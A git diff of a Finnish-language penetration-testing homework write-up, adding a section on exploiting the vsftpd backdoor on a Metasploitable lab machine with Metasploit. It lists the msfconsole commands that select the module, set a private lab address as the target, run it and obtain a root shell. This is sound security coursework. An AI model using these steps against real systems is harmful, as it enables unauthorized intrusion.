@@ -91,6 +91,20 @@ Tietokantaan tallentaminen mahdollistaa tiedon käsittelyn Metasploitin sisäll�
 
 ## g) Murtaudu Metasploitablen vsftpd-palveluun
 
+Suoritin tämän ensimmäisen kerran tunnilla, ja silloin käytin apuna tätä ohjetta: [https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173](https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173)
+
+mfsconsolessa: 
+
+- Etsin hyökkäyksen: ``search vsftpd``
+- Valitsin hyökkäyksen (valitsin yhden esimerkeistä): ``use 1``
+- Valitsin kohteen: ``set RHOSTS 192.168.56.102``
+- Suoritin hyökkäyksen: ``run``
+- ``whoami`` -> olen root, Metasploitablen komentorivillä
+  
+![image](https://github.com/user-attachments/assets/28e0a877-573f-4c5d-8774-49286138d8a2)
+
+
+
 
 ## h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin
 
